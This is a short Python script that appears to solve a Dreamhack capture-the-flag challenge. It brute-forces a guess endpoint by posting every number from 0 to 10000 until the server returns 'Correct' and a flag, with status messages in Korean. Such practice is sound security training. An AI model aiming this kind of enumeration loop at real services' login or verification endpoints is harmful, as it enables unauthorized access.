import requests

URL = 'http://host3.dreamhack.games:9213/guess'
START = 0
END = 10000

for guess in range(START, END + 1):
    try:
        res = requests.post(URL, data={'guess': str(guess)})
        json_data = res.json()
        
        if json_data.get('result') == 'Correct':
            print(f"\n[+] 정답 발견! 🎯 guess = {guess}")
            print(f"[+] FLAG: {json_data.get('flag')}")
            break
        else:
            print(f"[-] {guess}: Incorrect")
    except Exception as e:
        print(f"[!] 오류 발생 (guess={guess}): {e}")
